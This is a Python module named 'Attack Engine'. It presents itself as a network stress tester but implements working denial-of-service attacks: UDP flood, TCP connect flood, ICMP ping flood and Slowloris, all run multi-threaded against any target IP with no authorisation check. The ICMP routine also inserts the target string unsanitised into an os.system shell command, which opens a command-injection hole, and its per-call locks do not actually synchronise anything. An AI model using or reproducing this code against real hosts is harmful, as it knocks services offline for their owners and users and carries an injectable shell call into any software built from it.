"""
Attack Engine - Multi-threaded network stress testing
"""

import os
import sys
import socket
import random
import threading
import time
import subprocess
from typing import Dict, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


@dataclass
class AttackStats:
    """Attack statistics container"""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    is_running: bool = False
    target_ip: Optional[str] = None
    target_port: int = 80
    threads_active: int = 0
    
    def reset(self):
        """Reset all statistics"""
        self.total_requests = 0
        self.successful = 0
        self.failed = 0
        self.start_time = None
        self.end_time = None
        self.is_running = False
        self.threads_active = 0
    
    @property
    def duration(self) -> float:
        """Calculate attack duration"""
        if not self.start_time:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time
    
    @property
    def success_rate(self) -> float:
        """Calculate success rate percentage"""
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def rps(self) -> float:
        """Requests per second"""
        duration = self.duration
        if duration == 0:
            return 0.0
        return self.total_requests / duration


class AttackEngine:
    """Main attack engine with thread management"""
    
    def __init__(self, max_requests: int, thread_count: int, timeout: int):
        self.max_requests = max_requests
        self.thread_count = thread_count
        self.timeout = timeout
        self.stats = AttackStats()
        self._threads: list[threading.Thread] = []
        self._stop_event = threading.Event()
        
    def _check_limits(self) -> bool:
        """Check if attack should continue"""
        if self._stop_event.is_set():
            return False
        if self.stats.total_requests >= self.max_requests:
            return False
        if self.stats.duration >= self.timeout:
            return False
        return True
    
    def udp_flood(self, target_ip: str, target_port: int, max_per_thread: int):
        """UDP flood attack implementation"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        payload = bytearray(random.getrandbits(8) for _ in range(1024))
        local_count = 0
        
        try:
            while (self._check_limits() and 
                   local_count < max_per_thread and 
                   self.stats.is_running):
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    with threading.Lock():
                        self.stats.total_requests += 1
                        self.stats.successful += 1
                    local_count += 1
                except socket.error:
                    with threading.Lock():
                        self.stats.failed += 1
                    time.sleep(0.001)
                except Exception as e:
                    logger.error(f"UDP flood error: {e}")
                    break
        finally:
            sock.close()
            with threading.Lock():
                self.stats.threads_active -= 1
    
    def tcp_flood(self, target_ip: str, target_port: int, max_per_thread: int):
        """TCP SYN flood attack"""
        local_count = 0
        
        while (self._check_limits() and 
               local_count < max_per_thread and 
               self.stats.is_running):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                s.close()
                with threading.Lock():
                    self.stats.total_requests += 1
                    self.stats.successful += 1
                local_count += 1
            except (socket.timeout, socket.error, ConnectionRefusedError):
                with threading.Lock():
                    self.stats.failed += 1
                time.sleep(0.01)
            except Exception as e:
                logger.error(f"TCP flood error: {e}")
                break
        
        with threading.Lock():
            self.stats.threads_active -= 1
    
    def icmp_flood(self, target_ip: str, max_per_thread: int):
        """ICMP ping flood"""
        local_count = 0
        
        while (self._check_limits() and 
               local_count < max_per_thread and 
               self.stats.is_running):
            try:
                if os.name == 'nt':
                    result = os.system(f"ping -n 1 -w 1000 {target_ip} >nul 2>&1")
                else:
                    result = os.system(f"ping -c 1 -W 1 {target_ip} >/dev/null 2>&1")
                
                with threading.Lock():
                    self.stats.total_requests += 1
                    if result == 0:
                        self.stats.successful += 1
                    else:
                        self.stats.failed += 1
                local_count += 1
                time.sleep(0.1)  # ICMP has natural delay
            except Exception as e:
                logger.error(f"ICMP flood error: {e}")
                break
        
        with threading.Lock():
            self.stats.threads_active -= 1
    
    def slowloris(self, target_ip: str, target_port: int, max_per_thread: int):
        """Slowloris HTTP DoS"""
        local_count = 0
        connections = []
        
        while (self._check_limits() and 
               local_count < max_per_thread and 
               self.stats.is_running):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((target_ip, target_port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                connections.append(s)
                
                # Keep connection open
                for _ in range(10):
                    if not self._check_limits():
                        break
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        time.sleep(10)
                    except:
                        break
                
                s.close()
                if s in connections:
                    connections.remove(s)
                
                with threading.Lock():
                    self.stats.total_requests += 1
                    self.stats.successful += 1
                local_count += 1
                
            except Exception as e:
                logger.error(f"Slowloris error: {e}")
                with threading.Lock():
                    self.stats.failed += 1
                time.sleep(1)
        
        # Cleanup remaining connections
        for conn in connections:
            try:
                conn.close()
            except:
                pass
        
        with threading.Lock():
            self.stats.threads_active -= 1
    
    def start_attack(self, target_ip: str, target_port: int, method: str = "udp") -> bool:
        """Start multi-threaded attack"""
        if self.stats.is_running:
            logger.warning("Attack already in progress")
            return False
        
        # Reset stats
        self.stats.reset()
        self.stats.target_ip = target_ip
        self.stats.target_port = target_port
        self.stats.is_running = True
        self.stats.start_time = time.time()
        self._stop_event.clear()
        
        # Calculate requests per thread
        requests_per_thread = self.max_requests // self.thread_count
        
        # Select attack method
        attack_func: Callable
        if method == "udp":
            attack_func = lambda: self.udp_flood(target_ip, target_port, requests_per_thread)
        elif method == "tcp":
            attack_func = lambda: self.tcp_flood(target_ip, target_port, requests_per_thread)
        elif method == "icmp":
            attack_func = lambda: self.icmp_flood(target_ip, requests_per_thread)
        elif method == "slowloris":
            attack_func = lambda: self.slowloris(target_ip, target_port, requests_per_thread)
        else:
            attack_func = lambda: self.udp_flood(target_ip, target_port, requests_per_thread)
        
        # Launch threads
        logger.info(f"Starting {self.thread_count} threads for {method} attack")
        self._threads = []
        self.stats.threads_active = self.thread_count
        
        for i in range(self.thread_count):
            t = threading.Thread(
                target=attack_func,
                name=f"AttackThread-{i}",
                daemon=True
            )
            t.start()
            self._threads.append(t)
        
        return True
    
    def stop_attack(self) -> Dict:
        """Stop ongoing attack and return statistics"""
        logger.info("Stopping attack...")
        self._stop_event.set()
        self.stats.is_running = False
        self.stats.end_time = time.time()
        
        # Wait for threads to finish (max 10 seconds)
        for t in self._threads:
            t.join(timeout=10)
        
        return {
            'total': self.stats.total_requests,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'duration': self.stats.duration,
            'success_rate': self.stats.success_rate,
            'rps': self.stats.rps
        }
    
    def get_status(self) -> Dict:
        """Get current attack status"""
        return {
            'running': self.stats.is_running,
            'target': self.stats.target_ip,
            'port': self.stats.target_port,
            'progress': self.stats.total_requests,
            'max': self.max_requests,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'duration': self.stats.duration,
            'threads_active': self.stats.threads_active,
            'success_rate': self.stats.success_rate,
            'rps': self.stats.rps
        }
